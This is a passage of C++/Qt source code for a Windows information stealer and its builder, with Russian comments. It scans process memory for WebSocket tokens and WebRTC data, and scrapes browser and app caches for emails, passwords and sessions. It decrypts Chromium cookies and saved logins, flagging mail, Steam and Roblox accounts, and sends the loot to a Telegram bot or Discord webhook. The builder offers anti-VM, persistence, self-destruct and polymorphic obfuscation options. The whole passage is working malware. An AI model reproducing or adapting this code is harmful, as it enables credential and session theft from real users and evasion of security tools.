                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex wsRegex("wss?://[^\\s]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, wsRegex)) {
                                    result += "URL WebSocket: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, tokenRegex)) {
                                    result += "Токен WebSocket: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Захват WebRTC сессий
std::string CaptureWebRTCSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        Log("Ошибка создания снимка процессов для захвата WebRTC");
        return result;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096] = {0};
                    SIZE_T bytesRead = 0;
                    MEMORY_BASIC_INFORMATION mbi{};
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex webrtcRegex("ice-ufrag:[a-zA-Z0-9+/=]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, webrtcRegex)) {
                                    result += "Кандидат ICE WebRTC: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex ipRegex("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, ipRegex)) {
                                    result += "IP WebRTC: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Кража несохраненных данных браузера
std::string StealUnsavedBrowserData(const std::string& browserName, const std::string& cachePath) {
    std::string result;
    if (!std::filesystem::exists(cachePath)) {
        Log("Путь к кэшу не найден для " + QString::fromStdString(browserName) + ": " + QString::fromStdString(cachePath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
            if (entry.is_regular_file() && (entry.path().extension() == ".tmp" || entry.path().filename().string().find("Cache") != std::string::npos)) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Ошибка открытия файла кэша для " + QString::fromStdString(browserName) + ": " + QString::fromStdString(entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::vector<std::pair<std::regex, std::string>> patterns = {
                    {std::regex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"), "Несохранённый Email"},
                    {std::regex("pass(?:word)?=[^&\\s]+"), "Несохранённый пароль"},
                    {std::regex("\"autofill\":\"[^\"]+\""), "Данные автозаполнения"},
                    {std::regex("sessionid=[a-zA-Z0-9]+"), "Несохранённая сессия"}
                };

                for (const auto& [regex, label] : patterns) {
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, regex)) {
                        result += "[" + browserName + "] " + label + ": " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Ошибка в StealUnsavedBrowserData для " + QString::fromStdString(browserName) + ": " + QString::fromStdString(e.what()));
    }

    return result;
}

// Кража кэшированных данных приложений
std::string StealAppCacheData(const std::string& appName, const std::string& cachePath) {
    std::string result;
    if (!std::filesystem::exists(cachePath)) {
        Log("Путь к кэшу не найден для " + QString::fromStdString(appName) + ": " + QString::fromStdString(cachePath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
            if (entry.is_regular_file() && (entry.path().filename().string().find("cache") != std::string::npos || entry.path().extension() == ".tmp")) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Ошибка открытия файла кэша для " + QString::fromStdString(appName) + ": " + QString::fromStdString(entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::vector<std::pair<std::regex, std::string>> patterns = {
                    {std::regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}"), "Кэшированный токен"},
                    {std::regex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"), "Кэшированный Email"},
                    {std::regex("sessionid=[a-zA-Z0-9]+"), "Кэшированная сессия"}
                };

                for (const auto& [regex, label] : patterns) {
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, regex)) {
                        result += "[" + appName + "] " + label + ": " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Ошибка в StealAppCacheData для " + QString::fromStdString(appName) + ": " + QString::fromStdString(e.what()));
    }

    return result;
}

// Кража данных Chromium с улучшенной обработкой ошибок
std::string StealChromiumData(const std::string& browserName, const std::string& dbPath, const std::string& dir) {
    std::string result;
    if (!g_mainWindow || (!g_mainWindow->config.cookies && !g_mainWindow->config.passwords)) return result;

    auto safeSqliteOpen = [&](const std::string& path, sqlite3** db) -> bool {
        if (sqlite3_open_v2(path.c_str(), db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
            Log("Ошибка открытия базы данных для " + QString::fromStdString(browserName) + ": " + QString::fromStdString(sqlite3_errmsg(*db)));
            sqlite3_close(*db);
            *db = nullptr;
            return false;
        }
        return true;
    };

    std::string cookiesDbPath = dbPath + "Cookies";
    if (g_mainWindow->config.cookies && std::filesystem::exists(cookiesDbPath)) {
        sqlite3* db = nullptr;
        if (safeSqliteOpen(cookiesDbPath, &db)) {
            sqlite3_stmt* stmt = nullptr;
            const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { static_cast<DWORD>(sqlite3_column_bytes(stmt, 2)), const_cast<BYTE*>(static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2))) };
                    std::string value = DecryptChromiumData(encryptedData);
                    if (!value.empty()) {
                        std::vector<std::string> criticalDomains = {
                            "mail.google.com", "outlook.com", "yahoo.com", "mail.ru", "aol.com",
                            "protonmail.com", "icloud.com", "steampowered.com", "roblox.com"
                        };
                        bool isCritical = std::any_of(criticalDomains.begin(), criticalDomains.end(),
                            [&host](const std::string& domain) { return host.find(domain) != std::string::npos; });
                        result += "[" + browserName + "] " + (isCritical ? "Критический Cookie" : "Cookie") + " (" + host + ") | " + name + " | " + value + "\n";
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                Log("Ошибка подготовки SQL-запроса для cookies в " + QString::fromStdString(browserName));
            }
            sqlite3_close(db);
        }
    }

    std::string loginDbPath = dbPath + "Login Data";
    if (g_mainWindow->config.passwords && std::filesystem::exists(loginDbPath)) {
        sqlite3* db = nullptr;
        if (safeSqliteOpen(loginDbPath, &db)) {
            sqlite3_stmt* stmt = nullptr;
            const char* query = "SELECT origin_url, username_value, password_value FROM logins";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { static_cast<DWORD>(sqlite3_column_bytes(stmt, 2)), const_cast<BYTE*>(static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2))) };
                    std::string password = DecryptChromiumData(encryptedData);
                    if (!password.empty()) {
                        std::vector<std::string> criticalDomains = {
                            "mail.google.com", "outlook.com", "yahoo.com", "mail.ru", "aol.com",
                            "protonmail.com", "icloud.com", "steampowered.com", "roblox.com"
                        };
                        bool isCritical = std::any_of(criticalDomains.begin(), criticalDomains.end(),
                            [&url](const std::string& domain) { return url.find(domain) != std::string::npos; });
                        result += "[" + browserName + "] " + (isCritical ? "Критический пароль" : "Пароль") + " (" + url + ") | " + username + " | " + password + "\n";
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                Log("Ошибка подготовки SQL-запроса для паролей в " + QString::fromStdString(browserName));
            }
            sqlite3_close(db);
        }
    }

    if (!result.empty()) {
        std::string outputFile = dir + "\\" + browserName + "_data.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log("Данные " + QString::fromStdString(browserName) + " сохранены в: " + QString::fromStdString(outputFile));
        } else {
            Log("Ошибка сохранения данных " + QString::fromStdString(browserName) + " в: " + QString::fromStdString(outputFile));
        }
    }

    return result;
}

// Реализация методов MainWindow

void MainWindow::generateEncryptionKeys() {
    const int keyLength = 32;
    const int saltLength = 16;
    std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, chars.size() - 1);

    encryptionKey1.resize(keyLength);
    encryptionKey2.resize(keyLength);
    encryptionSalt.resize(saltLength);

    for (int i = 0; i < keyLength; ++i) {
        encryptionKey1[i] = chars[dis(gen)];
        encryptionKey2[i] = chars[dis(gen)];
    }
    for (int i = 0; i < saltLength; ++i) {
        encryptionSalt[i] = chars[dis(gen)];
    }
    Log("Ключи шифрования и соль сгенерированы");
}

void MainWindow::appendLog(const QString& message) {
    std::lock_guard<std::mutex> lock(g_mutex);
    if (ui && ui->textEdit) {
        ui->textEdit->append(message);
    }
}

MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWindow) {
    ui->setupUi(this);

    manager = new QNetworkAccessManager(this);
    buildTimer = new QTimer(this);
    statusCheckTimer = new QTimer(this);
    isBuilding = false;

    connect(ui->iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    connect(ui->buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
    connect(buildTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);

    g_mainWindow = this;
    generateEncryptionKeys();
    loadConfig();
}

MainWindow::~MainWindow() {
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
    g_mainWindow = nullptr;
}

// Эмиссия логов с потокобезопасностью
void MainWindow::emitLog(const QString& message) {
    std::lock_guard<std::mutex> lock(g_mutex);
    emit logUpdated(message);
}

// Добавление логов в UI с потокобезопасностью
void MainWindow::appendLog(const QString& message) {
    std::lock_guard<std::mutex> lock(g_mutex);
    if (ui && ui->textEdit) {
        QMetaObject::invokeMethod(ui->textEdit, "append", Qt::QueuedConnection, Q_ARG(QString, message));
    }
}

// Генерация случайной строки с криптографически безопасным RNG
std::string MainWindow::generateRandomString(size_t length) {
    const std::string characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::string randomString(length, '\0');
    BCRYPT_ALG_HANDLE hRng;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hRng, BCRYPT_RNG_ALGORITHM, nullptr, 0);
    if (BCRYPT_SUCCESS(status)) {
        std::vector<unsigned char> buffer(length);
        status = BCryptGenRandom(hRng, buffer.data(), length, 0);
        BCryptCloseAlgorithmProvider(hRng, 0);
        if (BCRYPT_SUCCESS(status)) {
            for (size_t i = 0; i < length; ++i) {
                randomString[i] = characters[buffer[i] % characters.size()];
            }
            return randomString;
        }
    }
    Log("Ошибка использования BCrypt для генерации случайной строки, переход к mt19937");
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, characters.size() - 1);
    for (size_t i = 0; i < length; ++i) {
        randomString[i] = characters[dis(gen)];
    }
    return randomString;
}

// Генерация уникального XOR-ключа
std::string MainWindow::generateUniqueXorKey() {
    return generateRandomString(16);
}

// Получение ключа шифрования
std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::string key = useFirstKey ? encryptionKey1 : encryptionKey2;
    return GetStaticEncryptionKey(key);
}

// Генерация IV
std::array<unsigned char, 16> MainWindow::generateIV() {
    return GenerateIV();
}

// Проверка на виртуальную машину
bool MainWindow::isRunningInVM() {
    return CheckVirtualEnvironment();
}

// Обновление конфигурации из UI
void MainWindow::updateConfigFromUI() {
    std::lock_guard<std::mutex> lock(g_mutex);
    config.telegramBotToken = ui->tokenLineEdit->text().toStdString();
    config.telegramChatId = ui->chatIdLineEdit->text().toStdString();
    config.discordWebhook = ui->discordWebhookLineEdit->text().toStdString();
    config.filename = ui->fileNameLineEdit->text().toStdString().empty() ? "output.exe" : ui->fileNameLineEdit->text().toStdString();
    config.iconPath = ui->iconPathLineEdit->text().toStdString();
    config.githubToken = ui->githubTokenLineEdit->text().toStdString();
    config.githubRepo = ui->githubRepoLineEdit->text().toStdString();
    config.sendMethod = ui->sendMethodComboBox->currentText().toStdString();
    config.buildMethod = ui->buildMethodComboBox->currentText().toStdString();
    config.steam = ui->steamCheckBox->isChecked();
    config.steamMAFile = ui->steamMAFileCheckBox->isChecked();
    config.epic = ui->epicCheckBox->isChecked();
    config.roblox = ui->robloxCheckBox->isChecked();
    config.battlenet = ui->battlenetCheckBox->isChecked();
    config.minecraft = ui->minecraftCheckBox->isChecked();
    config.discord = ui->discordCheckBox->isChecked();
    config.telegram = ui->telegramCheckBox->isChecked();
    config.chatHistory = ui->chatHistoryCheckBox->isChecked();
    config.cookies = ui->cookiesCheckBox->isChecked();
    config.passwords = ui->passwordsCheckBox->isChecked();
    config.screenshot = ui->screenshotCheckBox->isChecked();
    config.fileGrabber = ui->fileGrabberCheckBox->isChecked();
    config.stealFiles = ui->fileGrabberCheckBox->isChecked();
    config.systemInfo = ui->systemInfoCheckBox->isChecked();
    config.socialEngineering = ui->socialEngineeringCheckBox->isChecked();
    config.antiVM = ui->antiVMCheckBox->isChecked();
    config.fakeError = ui->fakeErrorCheckBox->isChecked();
    config.silent = ui->silentCheckBox->isChecked();
    config.autoStart = ui->autoStartCheckBox->isChecked();
    config.persist = ui->persistCheckBox->isChecked();
    config.selfDestruct = ui->selfDestructCheckBox->isChecked();
    config.sendToTelegram = (config.sendMethod == "Telegram");
    config.sendToDiscord = (config.sendMethod == "Discord");
    config.sendToServer = (config.sendMethod == "Local File");
    config.arizonaRP = ui->arizonaRPCheckBox->isChecked();  // Добавлено для Arizona RP
    config.radmirRP = ui->radmirRPCheckBox->isChecked();    // Добавлено для Radmir RP
}

// Сохранение конфигурации
void MainWindow::saveConfig() {
    QSettings settings("DeadCode", "StealerConfig"); // Изменено для уникальности
    settings.beginGroup("Config");
    settings.setValue("telegramBotToken", QString::fromStdString(config.telegramBotToken));
    settings.setValue("telegramChatId", QString::fromStdString(config.telegramChatId));
    settings.setValue("discordWebhook", QString::fromStdString(config.discordWebhook));
    settings.setValue("filename", QString::fromStdString(config.filename));
    settings.setValue("iconPath", QString::fromStdString(config.iconPath));
    settings.setValue("githubToken", QString::fromStdString(config.githubToken));
    settings.setValue("githubRepo", QString::fromStdString(config.githubRepo));
    settings.setValue("sendMethod", QString::fromStdString(config.sendMethod));
    settings.setValue("buildMethod", QString::fromStdString(config.buildMethod));
    settings.setValue("steam", config.steam);
    settings.setValue("steamMAFile", config.steamMAFile);
    settings.setValue("epic", config.epic);
    settings.setValue("roblox", config.roblox);
    settings.setValue("battlenet", config.battlenet);
    settings.setValue("minecraft", config.minecraft);
    settings.setValue("discord", config.discord);
    settings.setValue("telegram", config.telegram);
    settings.setValue("chatHistory", config.chatHistory);
    settings.setValue("cookies", config.cookies);
    settings.setValue("passwords", config.passwords);
    settings.setValue("screenshot", config.screenshot);
    settings.setValue("fileGrabber", config.fileGrabber);
    settings.setValue("systemInfo", config.systemInfo);
    settings.setValue("socialEngineering", config.socialEngineering);
    settings.setValue("antiVM", config.antiVM);
    settings.setValue("fakeError", config.fakeError);
    settings.setValue("silent", config.silent);
    settings.setValue("autoStart", config.autoStart);
    settings.setValue("persist", config.persist);
    settings.setValue("selfDestruct", config.selfDestruct);
    settings.setValue("arizonaRP", config.arizonaRP);  // Добавлено для Arizona RP
    settings.setValue("radmirRP", config.radmirRP);    // Добавлено для Radmir RP
    settings.endGroup();
    Log("Конфигурация сохранена");
}

// Загрузка конфигурации
void MainWindow::loadConfig() {
    QSettings settings("DeadCode", "StealerConfig");
    settings.beginGroup("Config");
    config.telegramBotToken = settings.value("telegramBotToken", "").toString().toStdString();
    config.telegramChatId = settings.value("telegramChatId", "").toString().toStdString();
    config.discordWebhook = settings.value("discordWebhook", "").toString().toStdString();
    config.filename = settings.value("filename", "output.exe").toString().toStdString();
    config.iconPath = settings.value("iconPath", "").toString().toStdString();
    config.githubToken = settings.value("githubToken", "").toString().toStdString();
    config.githubRepo = settings.value("githubRepo", "").toString().toStdString();
    config.sendMethod = settings.value("sendMethod", "Local File").toString().toStdString();
    config.buildMethod = settings.value("buildMethod", "Local Build").toString().toStdString();
    config.steam = settings.value("steam", false).toBool();
    config.steamMAFile = settings.value("steamMAFile", false).toBool();
    config.epic = settings.value("epic", false).toBool();
    config.roblox = settings.value("roblox", false).toBool();
    config.battlenet = settings.value("battlenet", false).toBool();
    config.minecraft = settings.value("minecraft", false).toBool();
    config.discord = settings.value("discord", false).toBool();
    config.telegram = settings.value("telegram", false).toBool();
    config.chatHistory = settings.value("chatHistory", false).toBool();
    config.cookies = settings.value("cookies", false).toBool();
    config.passwords = settings.value("passwords", false).toBool();
    config.screenshot = settings.value("screenshot", false).toBool();
    config.fileGrabber = settings.value("fileGrabber", false).toBool();
    config.systemInfo = settings.value("systemInfo", false).toBool();
    config.socialEngineering = settings.value("socialEngineering", false).toBool();
    config.antiVM = settings.value("antiVM", false).toBool();
    config.fakeError = settings.value("fakeError", false).toBool();
    config.silent = settings.value("silent", false).toBool();
    config.autoStart = settings.value("autoStart", false).toBool();
    config.persist = settings.value("persist", false).toBool();
    config.selfDestruct = settings.value("selfDestruct", false).toBool();
    config.arizonaRP = settings.value("arizonaRP", false).toBool();  // Добавлено для Arizona RP
    config.radmirRP = settings.value("radmirRP", false).toBool();    // Добавлено для Radmir RP
    settings.endGroup();

    std::lock_guard<std::mutex> lock(g_mutex);
    ui->tokenLineEdit->setText(QString::fromStdString(config.telegramBotToken));
    ui->chatIdLineEdit->setText(QString::fromStdString(config.telegramChatId));
    ui->discordWebhookLineEdit->setText(QString::fromStdString(config.discordWebhook));
    ui->fileNameLineEdit->setText(QString::fromStdString(config.filename));
    ui->iconPathLineEdit->setText(QString::fromStdString(config.iconPath));
    ui->githubTokenLineEdit->setText(QString::fromStdString(config.githubToken));
    ui->githubRepoLineEdit->setText(QString::fromStdString(config.githubRepo));
    ui->sendMethodComboBox->setCurrentText(QString::fromStdString(config.sendMethod));
    ui->buildMethodComboBox->setCurrentText(QString::fromStdString(config.buildMethod));
    ui->steamCheckBox->setChecked(config.steam);
    ui->steamMAFileCheckBox->setChecked(config.steamMAFile);
    ui->epicCheckBox->setChecked(config.epic);
    ui->robloxCheckBox->setChecked(config.roblox);
    ui->battlenetCheckBox->setChecked(config.battlenet);
    ui->minecraftCheckBox->setChecked(config.minecraft);
    ui->discordCheckBox->setChecked(config.discord);
    ui->telegramCheckBox->setChecked(config.telegram);
    ui->chatHistoryCheckBox->setChecked(config.chatHistory);
    ui->cookiesCheckBox->setChecked(config.cookies);
    ui->passwordsCheckBox->setChecked(config.passwords);
    ui->screenshotCheckBox->setChecked(config.screenshot);
    ui->fileGrabberCheckBox->setChecked(config.fileGrabber);
    ui->systemInfoCheckBox->setChecked(config.systemInfo);
    ui->socialEngineeringCheckBox->setChecked(config.socialEngineering);
    ui->antiVMCheckBox->setChecked(config.antiVM);
    ui->fakeErrorCheckBox->setChecked(config.fakeError);
    ui->silentCheckBox->setChecked(config.silent);
    ui->autoStartCheckBox->setChecked(config.autoStart);
    ui->persistCheckBox->setChecked(config.persist);
    ui->selfDestructCheckBox->setChecked(config.selfDestruct);
    ui->arizonaRPCheckBox->setChecked(config.arizonaRP);  // Добавлено для Arizona RP
    ui->radmirRPCheckBox->setChecked(config.radmirRP);    // Добавлено для Radmir RP

    Log("Конфигурация загружена");
}

// Экспорт логов на русском
void MainWindow::exportLogs() {
    QString fileName = QFileDialog::getSaveFileName(this, "Экспорт логов", "", "Текстовые файлы (*.txt)");
    if (fileName.isEmpty()) return;

    QFile file(fileName);
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << ui->textEdit->toPlainText();
        file.close();
        Log("Логи экспортированы в: " + fileName);
    } else {
        Log("Не удалось экспортировать логи в: " + fileName + " (Ошибка: " + QString::number(file.error()) + ")");
    }
}

// Обработчик кнопки выбора иконки
void MainWindow::on_iconBrowseButton_clicked() {
    QString fileName = QFileDialog::getOpenFileName(this, "Выбрать иконку", "", "Файлы иконок (*.ico)");
    if (!fileName.isEmpty()) {
        ui->iconPathLineEdit->setText(fileName);
        config.iconPath = fileName.toStdString();
        Log("Иконка выбрана: " + fileName);
    }
}

// Обработчик кнопки сборки
void MainWindow::on_buildButton_clicked() {
    updateConfigFromUI();
    if (config.buildMethod == "Local Build") {
        buildExecutable();
    } else if (config.buildMethod == "GitHub Actions") {
        triggerGitHubActions();
    } else {
        Log("Неизвестный метод сборки: " + QString::fromStdString(config.buildMethod));
    }
}

// Отправка данных с улучшенной обработкой ошибок
void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
    if (encryptedData.isEmpty() && files.empty()) {
        Log("Нет данных для отправки");
        return;
    }

    std::thread([this, encryptedData, files]() {
        try {
            if (config.sendToServer) sendDataToServer(encryptedData.toStdString(), files);
            if (config.sendToTelegram) sendToTelegram(encryptedData.toStdString(), files);
            if (config.sendToDiscord) sendToDiscord(encryptedData.toStdString(), files);
        } catch (const std::exception& e) {
            Log("Ошибка при отправке данных: " + QString::fromStdString(e.what()));
        }
    }).detach();
}

// Отправка данных на сервер (локальный файл)
void MainWindow::sendDataToServer(const std::string& encryptedData, const std::vector<std::string>& files) {
    std::string outputDir = "output";
    std::error_code ec;
    std::filesystem::create_directory(outputDir, ec);
    if (ec) {
        Log("Не удалось создать директорию вывода: " + QString::fromStdString(ec.message()));
        return;
    }

    std::string dataFile = outputDir + "\\data_" + std::to_string(GetTickCount64()) + ".txt";
    std::ofstream outFile(dataFile, std::ios::binary);
    if (outFile.is_open()) {
        outFile << encryptedData;
        outFile.close();
        Log("Данные сохранены в: " + QString::fromStdString(dataFile));
    } else {
        Log("Не удалось сохранить данные в: " + QString::fromStdString(dataFile));
    }

    for (const auto& file : files) {
        std::string destPath = outputDir + "\\" + std::filesystem::path(file).filename().string();
        try {
            std::filesystem::copy_file(file, destPath, std::filesystem::copy_options::overwrite_existing, ec);
            if (!ec) {
                Log("Файл скопирован в: " + QString::fromStdString(destPath));
            } else {
                Log("Не удалось скопировать файл " + QString::fromStdString(file) + ": " + QString::fromStdString(ec.message()));
            }
        } catch (const std::exception& e) {
            Log("Исключение при копировании файла " + QString::fromStdString(file) + ": " + QString::fromStdString(e.what()));
        }
    }
}

// Отправка данных в Telegram с улучшенной обработкой ошибок
void MainWindow::sendToTelegram(const std::string& encryptedData, const std::vector<std::string>& files) {
    if (config.telegramBotToken.empty() || config.telegramChatId.empty()) {
        Log("Токен бота Telegram или ID чата не указаны");
        return;
    }

    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

    if (!encryptedData.empty()) {
        QHttpPart textPart;
        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"document\"; filename=\"data.txt\""));
        textPart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("text/plain"));
        textPart.setBody(QByteArray(encryptedData.c_str(), encryptedData.size()));
        multiPart->append(textPart);
    }

    for (const auto& filePath : files) {
        QFile* file = new QFile(QString::fromStdString(filePath));
        if (file->open(QIODevice::ReadOnly)) {
            QHttpPart filePart;
            filePart.setHeader(QNetworkRequest::ContentDispositionHeader,
                               QVariant("form-data; name=\"document\"; filename=\"" + QString::fromStdString(std::filesystem::path(filePath).filename().string()) + "\""));
            filePart.setBodyDevice(file);
            file->setParent(multiPart);
            multiPart->append(filePart);
        } else {
            Log("Не удалось открыть файл для Telegram: " + QString::fromStdString(filePath));
            delete file;
        }
    }

    QNetworkRequest request(QUrl(QString("https://api.telegram.org/bot%1/sendDocument?chat_id=%2")
                                 .arg(QString::fromStdString(config.telegramBotToken))
                                 .arg(QString::fromStdString(config.telegramChatId))));
    QNetworkReply* reply = manager->post(request, multiPart);
    multiPart->setParent(reply);

    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        replyFinished(reply);
    });
}

// Отправка данных в Discord
void MainWindow::sendToDiscord(const std::string& encryptedData, const std::vector<std::string>& files) {
    if (config.discordWebhook.empty()) {
        Log("Вебхук Discord не указан");
        return;
    }

    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

    if (!encryptedData.empty()) {
        QHttpPart textPart;
        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"data.txt\""));
        textPart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("text/plain"));
        textPart.setBody(QByteArray(encryptedData.c_str(), encryptedData.size()));
        multiPart->append(textPart);
    }

    for (const auto& filePath : files) {
        QFile* file = new QFile(QString::fromStdString(filePath));
        if (file->open(QIODevice::ReadOnly)) {
            QHttpPart filePart;
            filePart.setHeader(QNetworkRequest::ContentDispositionHeader,
                               QVariant("form-data; name=\"file\"; filename=\"" + QString::fromStdString(std::filesystem::path(filePath).filename().string()) + "\""));
            filePart.setBodyDevice(file);
            file->setParent(multiPart);
            multiPart->append(filePart);
        } else {
            Log("Не удалось открыть файл для Discord: " + QString::fromStdString(filePath));
            delete file;
        }
    }

    QNetworkRequest request(QUrl(QString::fromStdString(config.discordWebhook)));
    QNetworkReply* reply = manager->post(request, multiPart);
    multiPart->setParent(reply);

    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        replyFinished(reply);
    });
}

// Обработка ответа от сети
void MainWindow::replyFinished(QNetworkReply* reply) {
    if (reply->error() == QNetworkReply::NoError) {
        Log("Данные успешно отправлены");
    } else {
        Log("Не удалось отправить данные: " + reply->errorString());
    }
    reply->deleteLater();
}

// Генерация полиморфного кода
void MainWindow::generatePolymorphicCode() {
    std::string polyCode = GeneratePolymorphicCode();
    std::ofstream outFile("polymorphic_code.h", std::ios::binary);
    if (outFile.is_open()) {
        outFile << polyCode;
        outFile.close();
        Log("Полиморфный код сгенерирован");
    } else {
        Log("Не удалось сгенерировать полиморфный код");
    }
}

// Генерация заголовка ключей
void MainWindow::generateBuildKeyHeader() {
    std::ofstream outFile("build_key.h", std::ios::binary);
    if (outFile.is_open()) {
        outFile << "#ifndef BUILD_KEY_H\n";
        outFile << "#define BUILD_KEY_H\n\n";
        outFile << "#include <array>\n";
        outFile << "#include <string>\n\n";
        outFile << "std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& key);\n";
        outFile << "std::array<unsigned char, 16> GenerateIV();\n\n";
        outFile << "#endif // BUILD_KEY_H\n";
        outFile.close();
        Log("Заголовок ключей сборки сгенерирован");
    } else {
        Log("Не удалось сгенерировать заголовок ключей сборки");
    }
}

// Генерация мусорного кода
void MainWindow::generateJunkCode() {
    std::string junkCode = GenerateJunkCode();
    std::ofstream outFile("junk_code_generated.h", std::ios::binary);
    if (outFile.is_open()) {
